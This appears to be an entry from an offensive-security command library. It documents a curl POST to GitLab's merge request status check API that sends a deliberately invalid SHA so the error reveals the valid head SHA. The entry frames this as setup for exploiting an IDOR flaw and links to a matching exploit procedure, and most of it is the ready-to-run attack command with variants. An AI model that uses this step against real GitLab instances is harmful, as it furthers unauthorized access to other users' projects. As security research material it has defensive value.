---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: |-
  curl --request POST \
    --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=a&external_status_check_id=2' \
    --header 'Authorization: Bearer <TOKEN>'
tags:
  - api
  - gitlab
  - error-trigger
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:32:20.670Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-status-check-error-sha

## Command

```bash
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=a&external_status_check_id=2' \
  --header 'Authorization: Bearer <TOKEN>'
```

## Description

This command sends a POST request to the GitLab status check responses API with an invalid SHA ('a') to trigger an error response that reveals the correct commit SHA for the merge request head. Used in the initial phase of IDOR exploitation setup.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--url` | API endpoint with placeholders for ATTACKID, invalid sha='a', and external_status_check_id=2 | Yes |
| `--header 'Authorization: Bearer <TOKEN>'` | Authenticates the request using the personal access token | Yes |
| `<ATTACKID>` | Attacker's project ID | Yes |
| `<TOKEN>` | Personal access token | Yes |

## Examples

### Basic Usage

```bash
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/123/merge_requests/1/status_check_responses?sha=a&external_status_check_id=2' \
  --header 'Authorization: Bearer glpat-abc123'
```

### Advanced Usage

Add `-v` for verbose output to inspect headers and response details:

```bash
curl -v --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=a&external_status_check_id=2' \
  --header 'Authorization: Bearer <TOKEN>'
```

## Expected Output

Error JSON response like {"message":"Invalid SHA: the correct sha is abcdef1234567890..."} indicating the valid SHA for use in subsequent requests.

## Related

- [[commands/curl-gitlab-status-check-own]]
- [[procedures/Exploit-IDOR-in-GitLab-Status-Check-API]]
